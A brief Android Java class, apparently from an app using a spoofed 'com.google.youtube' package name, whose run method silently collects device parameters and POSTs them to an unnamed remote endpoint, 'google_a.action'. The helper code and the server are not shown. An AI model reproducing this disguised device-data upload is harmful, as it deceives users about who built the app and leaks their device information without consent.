package com.google.youtube.services;

import android.content.Context;

import com.google.youtube.utils.HttpUtil;
import com.google.youtube.utils.MyHelpUtil;

/**
 * 联网信息
 * 
 * @author xcl
 *
 */
public class SiConnection implements Runnable {

	private Context context;

	public SiConnection(Context context) {
		// TODO Auto-generated constructor stub

		this.context = context;
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub

		String paramsString = MyHelpUtil.add_device_params(context);

		try {
			HttpUtil.postRequest(HttpUtil.BASE_URL + "google_a.action",
					paramsString);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

}
